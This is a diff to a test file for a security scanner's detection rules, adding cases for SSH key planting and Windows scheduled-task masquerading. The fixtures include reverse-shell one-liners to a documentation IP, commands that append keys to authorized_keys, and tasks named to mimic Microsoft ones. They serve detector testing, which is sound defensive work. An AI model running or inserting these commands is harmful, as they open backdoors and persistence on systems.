@@ -53,6 +53,10 @@ def _scan(tmp_path: Path, name: str, text: str):
     ("a.js", f'const K = "{_KEY}";\nfs.appendFileSync(home + "/.ssh/authorized_keys", K);\n'),
     ("a.py", f'K = "{_KEY}"\nwith open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as f:\n'
              "    f.write(K)\n"),
+    # A key planted on this machine, its comment a user@host: no ssh command, still a way in.
+    ("a.ps1", '$key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLACEHOLDERPLACEHOLDER op@relay"\n'
+              'Add-Content -Path "$env:USERPROFILE\\.ssh\\authorized_keys" -Value $key\n'),
+    ("a.sh", f'mkdir -p ~/.ssh && echo "{_KEY}" >> ~/.ssh/authorized_keys\n'),
     ("a.sh", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n"),
     ("a.sh", "nc 203.0.113.9 4444 -e /bin/sh\n"),
     ("a.sh", "socat tcp:203.0.113.9:4444 exec:'bash -li',pty\n"),
@@ -96,6 +100,13 @@ def test_remote_access_fires(tmp_path: Path, name: str, text: str):
     # User management in a configuration tool: the account comes from a parameter (salt-ssh).
     ("a.py", "cmd = \"dscl . -create /Users/{} Password '*'\".format(name)\n"),
     ("a.bat", "net user %1 %2 /add\n"),
+    # The operator's own key provisioned on their servers over ssh: nothing opens on this machine.
+    ("a.sh", f'PUB="{_KEY}"\nfor ip in "${{HOSTS[@]}}"; do\n'
+             '  sshpass -p "$PASS" ssh -o ConnectTimeout=15 "root@${ip}" \\\n'
+             "    \"grep -qF '${PUB}' ~/.ssh/authorized_keys || echo '${PUB}' >> "
+             '~/.ssh/authorized_keys"\ndone\n'),
+    ("a.py", f'PUB = "{_KEY}"\nc = paramiko.SSHClient()\nc.connect(host, username=user)\n'
+             "cmd = f\"echo '{{PUB}}' >> ~/.ssh/authorized_keys\"\nc.exec_command(cmd)\n"),
 ])
 def test_remote_access_silent(tmp_path: Path, name: str, text: str):
     assert "ST-POSTEX-REMOTE-ACCESS" not in _ids(_scan(tmp_path, name, text))
@@ -157,6 +168,18 @@ _AGENT_WRITE = 'fs.writeFileSync(path.join(home, "Library/LaunchAgents/{}.plist"
     ("a.sh", "launchctl load -w /System/Library/LaunchAgents/com.apple.Siri.agent.plist\n",
      False),
     ("a.bat", "schtasks /create /tn AcmeUpdater /sc onlogon /tr C:\\x\\u.exe\n", False),
+    # A name written out in an argv array, or after an escaped quote, still imitates the vendor.
+    ("a.py", 'subprocess.run(["schtasks", "/Create", "/TN", "MicrosoftEdgeUpdateTaskUA", '
+             '"/TR", cmd, "/SC", "ONLOGON"])\n', True),
+    ("a.js", 'execSync("schtasks /create /tn \\"\\\\Microsoft\\\\Windows\\\\Sync\\" /tr x.exe");\n',
+     True),
+    # The task's own name held in a variable or a function whose name begins with "windows".
+    ("a.py", 'subprocess.run(["schtasks", "/Create", "/TN", windows_task_name(), "/TR", cmd, '
+             '"/SC", "ONLOGON"])\n', False),
+    ("a.py", 'WINDOWS_TASK_NAME = "AcmeDaemon"\n'
+             'print(f"register with `schtasks /Create /TN {WINDOWS_TASK_NAME} /XML x.xml /F`")\n',
+     False),
+    ("a.ps1", "Register-ScheduledTask -TaskName $WindowsTaskName -Action $a -Trigger $t\n", False),
 ])
 def test_masquerade(tmp_path: Path, name: str, text: str, fires: bool):
     report = _scan(tmp_path, name, text)
